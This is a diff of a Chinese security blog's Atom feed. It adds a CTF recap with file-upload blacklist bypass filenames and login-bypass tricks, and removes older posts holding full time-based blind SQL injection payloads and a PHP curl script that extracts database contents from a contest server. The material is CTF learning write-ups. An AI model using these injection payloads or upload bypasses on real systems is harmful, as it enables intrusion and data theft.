@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://lazysheep.cc/"/>
-  <updated>2015-04-21T13:44:34.000Z</updated>
+  <updated>2015-05-20T05:40:32.000Z</updated>
   <id>http://lazysheep.cc/</id>
   
   <author>
@@ -13,6 +13,84 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[ddddd]]></title>
+    <link href="http://lazysheep.cc/2015/05/20/0x25/"/>
+    <id>http://lazysheep.cc/2015/05/20/0x25/</id>
+    <published>2015-05-20T05:40:32.000Z</published>
+    <updated>2015-05-20T05:40:32.000Z</updated>
+    <content type="html"></content>
+    <summary type="html">
+    
+    </summary>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[CUIT总结]]></title>
+    <link href="http://lazysheep.cc/2015/05/19/0x24/"/>
+    <id>http://lazysheep.cc/2015/05/19/0x24/</id>
+    <published>2015-05-19T03:25:02.000Z</published>
+    <updated>2015-05-20T07:10:18.000Z</updated>
+    <content type="html"><![CDATA[<p><strong>上个周末的CUIT好多渗透题，，可是一题也没撸出来，但是看完writeup后，学到了好多姿势，，这里做一个总结。。</strong><br><a id="more"></a></p>
+<h2 id="PT1:">PT1:</h2><blockquote>
+<p>这题的第一步都没撸出来。。。第一步是找源码。。看完writeup后才知道，源码在 ‘.DS_Store’ 中。。。</p>
+<p>‘.DS_Store’ 是MAC(OSX系统)的默认备份文件(╮（╯▽╰）╭。。用不起MAC。。)</p>
+</blockquote>
+<p>至今在CTF中遇到的备份文件：</p>
+<blockquote>
+<ul>
+<li>Linux : xxx.php　—&gt;  xxx.php~ || .xxx.php.swp</li>
+<li>bak的后缀 —&gt; xxx.xxx.bak</li>
+<li>有时候还可以试试压缩文件 —&gt; xxx.rar || xxx.zip</li>
+<li>还有就是这次遇到MAC系统中的 ‘.DS_Store’ —&gt; 保存的是该目录下的特殊信息，针对的是文件夹，而不是文件</li>
+</ul>
+</blockquote>
+<h2 id="PT2:">PT2:</h2><blockquote>
+<p>JAVA的题，并不会。。。。</p>
+</blockquote>
+<h2 id="PT3">PT3</h2><blockquote>
+<p>修为不够，，并不明白</p>
+</blockquote>
+<h2 id="PT4">PT4</h2><blockquote>
+<p>这题是文件上传漏洞，有了黑名单过滤，一直在想怎么绕过。。。可是并没撸出来。。。看了writeup后，，才知道要用 ‘:’ 截断绕过，这个比较迷，冒号我是试过的，我构造的文件名是这样的: ‘flag.php:.jpg’ 可是there is no egg use…writeup中的文件名是: ‘flag.php:1’ …迷一样的绕过。。</p>
+<p>然后得到了另一种黑魔法: ‘flag.php::$DATA’ 据说这样也可以绕过黑名单，不过这题过滤了 ‘$’ 所以这个没用。</p>
+<p>还有一个也许不是黑魔法，毕竟我没用过iis :</p>
+</blockquote>
+<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在php + iis + <span class="built_in">window</span>　环境下：</span><br><span class="line">双引号(<span class="string">'"'</span>) &lt;=<span class="function">=&gt;</span> 点号(<span class="string">"."</span>);</span><br><span class="line">大于号(<span class="string">"&gt;"</span>) &lt;=<span class="function">=&gt;</span> 问号(<span class="string">"?"</span>);</span><br><span class="line">小于号(<span class="string">"&lt;"</span>) &lt;=<span class="function">=&gt;</span> 星号(<span class="string">"*"</span>);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>在window环境下，上传了flag.php后，再上传flag.ph<em>(flag.</em>hp…之类)，将会自动匹配 ‘*’ ,然后覆盖 ‘flag.php’ 文件</p>
+</blockquote>
+<h2 id="PT5">PT5</h2><blockquote>
+<p>这题第一步是一个很简单的万能密码。。。可是我连第一步都没撸出来。。<br>我认为这题我最大的问题就是没把渗透题和web题结合起来，一开始我就被这题是渗透题影响，试了一个’or 1#失败后就没在尝试了，(这题把or还有注释符过滤了，所以前面的payload当然不行，需要把or换成||)潜意识就觉得渗透题不会像web题一样，会出现这么明显的注入点。。。<br>这里顺便说说我理解的web和渗透：web —&gt; 日一点　;  渗透 —&gt; 找一点then去日;</p>
+</blockquote>
+<h2 id="PT6">PT6</h2><blockquote>
+<p>这题一开始就提示了，这题是实战。。目前为止，我就撸过两次声称是实战的比赛，一次是ALICTF还有一次就是这次的CUIT了。。。。</p>
+</blockquote>
+<p>来说说就我理解的实战题：</p>
+<blockquote>
+<ul>
+<li>扫目录，扫端口，扫旁站，爆破</li>
+<li>社工</li>
+<li>web</li>
+</ul>
+</blockquote>
+<p>实战其实就相当于是日站的步骤吧，一个大型的网站，不可能一眼就被你看出漏洞，这时候就需要我们去寻找这个网站的短板</p>
+<blockquote>
+<p>这题我感觉比较坑，我做的基本和writeup中的一样，找到了一个反射型XSS，发给管理员，可是管理员却说我的链接让他的浏览器奔溃了。。。什么鬼。。。writeup中跟我用同一个payload都成功得到cookie了。。。。。。心累～～～</p>
+</blockquote>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p><strong>上个周末的CUIT好多渗透题，，可是一题也没撸出来，但是看完writeup后，学到了好多姿势，，这里做一个总结。。</strong><br>]]>
+    
+    </summary>
+    
+      <category term="CTF" scheme="http://lazysheep.cc/tags/CTF/"/>
+    
+      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
+    
+  </entry>
   
   <entry>
     <title><![CDATA[fuck RSA writeup]]></title>
@@ -589,90 +667,6 @@
 ]]></content>
     <summary type="html">
     <![CDATA[<p><strong>题做多了果然有经验了，5小时AK了这周的四题</strong><br>拿了两题的一血～～～</p>]]>
-    
-    </summary>
-    
-      <category term="CTF" scheme="http://lazysheep.cc/tags/CTF/"/>
-    
-      <category term="SQLi" scheme="http://lazysheep.cc/tags/SQLi/"/>
-    
-      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[SQLi用到的一些猥琐函数]]></title>
-    <link href="http://lazysheep.cc/2015/02/04/0x10/"/>
-    <id>http://lazysheep.cc/2015/02/04/0x10/</id>
-    <published>2015-02-04T03:02:26.000Z</published>
-    <updated>2015-02-07T03:50:28.000Z</updated>
-    <content type="html"><![CDATA[<p>通过一个payload来总结SQLi时<br><a id="more"></a><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hack.com/index.php?l=1 PROCEDURE analyse ((<span class="operator"><span class="keyword">select</span> extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(schema_name <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)) <span class="keyword">FROM</span> INFORMATION_SCHEMA.SCHEMATA <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">97</span>, <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>);</span></span><br></pre></td></tr></table></figure></p>
-<p>上面用到的函数有 <code>procedure analyse</code> 、<code>rand()</code>、<code>concat()</code>、<code>if()</code>、<code>ord()</code>、<code>mid()</code>、<code>ifnull()</code>、<code>cast()</code>、<code>benchmark()</code></p>
-<p>(PS:大写看得超不爽，，就都小写了)</p>
-<h3 id="0x0_benchmark(x,_y)">0x0 benchmark(x, y)</h3><p>基于时间盲注的猥琐函数，，//该函数表示执行x次y<br>eg：<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="header">mysql &gt; select benchmark(5000000,sha1(1));   //执行5000000次sha1(1)</span><br><span class="line">+----------------------------+</span></span><br><span class="line"><span class="header">| benchmark(5000000,sha1(1)) |</span><br><span class="line">+----------------------------+</span></span><br><span class="line"><span class="header">|                          0 |</span><br><span class="line">+----------------------------+</span></span><br><span class="line">1 row in set (2.58 sec)</span><br></pre></td></tr></table></figure></p>
-<p>执行了5000000次sha1加密，，，你说服务器会不会有延迟？<br>和这一样的我记得还有<code>sleep()</code>，不过我还没去研究<br>过这个函数。。</p>
-<h3 id="0x1_cast(x_as_type)">0x1 cast(x as type)</h3><p>强制对x经行格式转换，，type就是像char(字符),int(整型)这类的；</p>
-<h3 id="0x2_ifnull(x_,_y)">0x2 ifnull(x , y)</h3><p>判断x是否为null，是null -&gt; 返回y，否 -&gt; 返回x；</p>
-<h3 id="0x3_mid(x,y,z)">0x3 mid(x,y,z)</h3><p>应该叫取值函数把，从字符串x中第y位取z位数；<br>eg:<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="header">mysql &gt; select mid("abcde",1,2);     //从字符串第1位开始，取两个值</span><br><span class="line">+------------------+</span></span><br><span class="line"><span class="header">| mid("abcde",1,2) |</span><br><span class="line">+------------------+</span></span><br><span class="line"><span class="header">| ab               |</span><br><span class="line">+------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
-<p>（PS：这里不知道为什么是从1开始，而不是从0开始。。。）</p>
-<h3 id="0x4_ORD(x)">0x4 ORD(x)</h3><p>把字符x转换为ascii码。。。用途。。看了后面你就知道了。。</p>
-<h3 id="0x5_if(x,y,z)">0x5 if(x,y,z)</h3><p>我觉得猥琐的部分就是从0x0到0x4用0x5组合起来后。。先说说这个函数吧。。。。if(x,y,z)  //如果x为真，则y，否则z；<br>来看看他们组合的结果：<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="header">mysql &gt; select if((ord(mid((select version()),1,1))) like 53,1,benchmark(5000000,sha1(1))) a;</span><br><span class="line">+---+</span></span><br><span class="line"><span class="header">| a |</span><br><span class="line">+---+</span></span><br><span class="line"><span class="header">| 1 |</span><br><span class="line">+---+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
-<p>我来翻译下这段话首先你先试试<code>select version();</code>，在我这出来的是<code>5.5.37-log</code>，然后就是mid取第一个开始一个值，也就是’5’，然后ord转换为ascii码为53，接着就是if()判断函数，’like’就是等于意思，如果前面的东西等于53，则执行1，否则执行benchmark()这个延迟函数。。<br>可试试把’like’改为’&gt;’或’&lt;’，输出则是延迟了。。</p>
-<h3 id="0x6">0x6</h3><p>然后剩下的还有，<code>rand()</code>随机函数，<code>concat(x,y,...)</code>连接函数，<code>procedure analyse()</code>在基于<code>limit</code>之后 的注入才会用到。。。<br>由于我还未发现其中的猥琐成分。。。所以就写到这了。。。</p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p>通过一个payload来总结SQLi时<br>]]>
-    
-    </summary>
-    
-      <category term="SQLi" scheme="http://lazysheep.cc/tags/SQLi/"/>
-    
-      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[week2]]></title>
-    <link href="http://lazysheep.cc/2015/02/01/0x0F/"/>
-    <id>http://lazysheep.cc/2015/02/01/0x0F/</id>
-    <published>2015-02-01T03:45:46.000Z</published>
-    <updated>2015-04-18T13:35:22.000Z</updated>
-    <content type="html"><![CDATA[<p>week2 writeup～～这周题目比较简单，，已经拿了两题的一血了～<br><a id="more"></a></p>
-<h2 id="0x3_颇有技巧的SQL注入(Rank:_500)">0x3 颇有技巧的SQL注入(Rank: 500)</h2><p>这周唯一的难题就这道了，，，还超过Week1的难度。。。<br>看了简单的writeup。。。还是不懂。。。。决定。。还是先好好学SQL吧。。。。</p>
-<p>=================================================write time : 1/2 10:00</p>
-<p>经过会长大人的启发，，，经过一个晚上和早上的奋斗，，，终于拿下这题的一血。。。不过我写脚本的能力还不行，用php的curl跑，，老是把服务器跑瘫。。。所以最终只能半手工半脚本。。。。。。这里链接三个页面</p>
-<p><a href="http://lazysheep.cc/2015/02/04/0x10/" target="_blank" rel="external">我的下一篇博文</a><br><a href="http://lightless.me/archives/Limit-Injection-Writeup.html" target="_blank" rel="external">Payload</a><br><a href="http://www.freebuf.com/articles/web/34619.html" target="_blank" rel="external"> 安全科普：SQLi Labs 指南 Part 1 </a><br>PS:给我启发的是Part 2，自己自行搜索。。。如果上面三个链接里的都看不懂，，下面就不用看了。。因为也看不懂。。</p>
-<p>会长的payload :<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://104.236.171.163/week2/limit/?l=1 PROCEDURE analyse((<span class="operator"><span class="keyword">select</span> extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(schema_name <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)) <span class="keyword">FROM</span> INFORMATION_SCHEMA.SCHEMATA <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">97</span>, <span class="keyword">BENCHMARK</span> (<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>);</span></span><br></pre></td></tr></table></figure></p>
-<p>开始用这个注，注出第一个数据库是i开头的，猜测information_schema，就没注了，第二个数据库注出来是”ctfaweekaaweb”，第三个”ctfaweekaaim”<br>（现在知道了注出来的这些有些字符串不对，有服务器崩了，和我脚本写的问题）。。。然后开始换思路，改payload，注出当前数据库，下面是我改的payload：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://104.236.171.163/week2/limit/?l=1 PROCEDURE analyse((<span class="operator"><span class="keyword">select</span> extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>((<span class="keyword">select</span> <span class="keyword">database</span>()) <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">97</span> ,<span class="number">1</span>, <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="number">1</span>))))))),<span class="number">1</span>);</span></span><br></pre></td></tr></table></figure></p>
-<p>注出来了当前数据库为<code>ctf_week2_limit</code>,现在看来就应该是我上面注出的第三个数据库。。。然后继续改payload注表名：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://104.236.171.163/week2/limit/?l=1 PROCEDURE analyse((<span class="operator"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(table_name <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)) <span class="keyword">FROM</span> INFORMATION_SCHEMA.<span class="keyword">TABLES</span> <span class="keyword">where</span> table_schema=<span class="string">"ctf_week2_limit"</span>  <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) &lt; <span class="number">97</span>,<span class="number">1</span>, <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="number">1</span>))))))),<span class="number">1</span>);</span></span><br></pre></td></tr></table></figure></p>
-<p>运气好，第一个表名就是<code>flag</code>，那方向应该就对了，，会长在他的博客中说了Flag在flag表中，接下来注字段名，下来是payload：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://104.236.171.163/week2/limit/?l=1 PROCEDURE analyse((<span class="operator"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(column_name <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)) <span class="keyword">FROM</span> INFORMATION_SCHEMA.<span class="keyword">columns</span> <span class="keyword">where</span> table_name=<span class="string">"flag"</span>  <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">97</span>,<span class="number">1</span>, <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="number">1</span>))))))),<span class="number">1</span>);</span></span><br></pre></td></tr></table></figure></p>
-<p>注出来两个字段名，<code>ctf_limit_flag</code>，和 <code>flag</code>，开头以为flag在字段名<code>flag</code>下，可是什么也没注出来，然后注<code>ctf_limit_flag</code>下的内容，注出了开头是<code>hctf{</code>然后就知道是这个了～～～下面是payload：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://104.236.171.163/week2/limit/?l=1 PROCEDURE analyse((<span class="operator"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(ctf_limit_flag <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)) <span class="keyword">FROM</span> ctf_week2_limit.flag <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">97</span> ,<span class="number">1</span>, <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="number">1</span>))))))),<span class="number">1</span>);</span></span><br></pre></td></tr></table></figure></p>
-<p>====================================================write time : 4/2 11:00</p>
-<p>发一个我写的难看的脚本<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注当前数据库的脚本</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">1</span>;<span class="variable">$j</span>&lt;<span class="number">10</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">47</span>;<span class="variable">$i</span>&lt;<span class="number">123</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">		<span class="variable">$login_url</span> = <span class="string">'http://104.236.171.163/week2/limit/?l=1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST((select database()) AS CHAR),0x20)) LIMIT 0,1),".$j.",1)) &gt; ".$i." ,1, BENCHMARK(5000000,SHA1(1))))))),1);'</span>;</span><br><span class="line">		<span class="variable">$ch</span> = curl_init(<span class="variable">$login_url</span>);</span><br><span class="line">		curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER,<span class="number">1</span>);</span><br><span class="line">		<span class="variable">$stime</span>=microtime(<span class="keyword">true</span>);</span><br><span class="line">		<span class="variable">$arr</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">		<span class="variable">$etime</span>=microtime(<span class="keyword">true</span>);</span><br><span class="line">		curl_close(<span class="variable">$ch</span>);</span><br><span class="line">		<span class="comment">//$total=$etime-$stime;</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$total</span>=<span class="variable">$etime</span>-<span class="variable">$stime</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$total</span>&gt;<span class="number">2</span>)&#123;</span><br><span class="line">			<span class="keyword">echo</span> chr(<span class="variable">$i</span>);</span><br><span class="line">			<span class="variable">$i</span> = <span class="number">123</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>//在变量$j的位置必须改成手工。。。这个脚本拿去跑服务器会崩，然后就是在$j的位置从1开始一直跑到结束。。。什么情况是结束呢。。。我没有聪明的方法。。。笨方法是<code>LIMIT 0,1),1,1)) &gt; $i</code>改成 <code>LIMIT 0,1),1,1)) &lt; 33</code>为真的情况下结束了。。</p>
-<p>==========================================================</p>
-<p>然后就是要知道数据库的结构，在<code>information_schema</code>数据库中<em>“SCHEMA”</em>储存着你电脑上所以数据库名，<em>“TABLES”</em>储存着所有的表名，<em>“COLUMNS”</em>储存着表的字段名～～～～～～</p>
-<p>==========================================================</p>
-<p>//<strong>新手上路，大神勿喷</strong></p>
-<h2 id="0x4_最简单的题目(Rank:_10)">0x4 最简单的题目(Rank: 10)</h2><p>打开题目链接，，果真是最简单的题目，，，放在眼前的flag都找不到就不要玩CTF了～～没什么好讲的。。</p>
-<p>这题就是靠拼手速拿一血～～</p>
-<p>=================================================write time : 1/2 10:00</p>
-<h2 id="0x5_基础训练(Rank:_100)">0x5 基础训练(Rank: 100)</h2><p>也是比较简单的一题，打开来一看，根据提示，首先看cookie：</p>
-<p><code>flag:bGlnaHRsZXNzOjQ3NmExMGYxZjNkZGU1MWQxYjUyMjY3YzFhY2NjMzll</code></p>
-<p>把flag后面的东西拿去base64解密，，，得到：</p>
-<p><code>lightless:476a10f1f3dde51d1b52267c1accc39e</code></p>
-<p>接着发现<code>lightless</code>进行md5加密后就可以得到后面的那串东西。。</p>
-<p>接下来就是图片了。。放个图片在这，打酱油的可能性很小。。百度后得知：</p>
-<p><img src="/img/666.png" alt="鸢一折纸"></p>
-<p>得到图片上这女的罗马音为：Tobiichi Origami</p>
-<p>然后造着原来的flag形式伪造cookie～～～得到：</p>
-<p><code>Tobiichi Origami:097b235243b09755b3f586f201e8da8d</code></p>
-<p>改cookie，提交～～</p>
-<p>Get Flag！</p>
-<p>==================================================write time : 1/2 10:00</p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p>week2 writeup～～这周题目比较简单，，已经拿了两题的一血了～<br>]]>
     
     </summary>
     
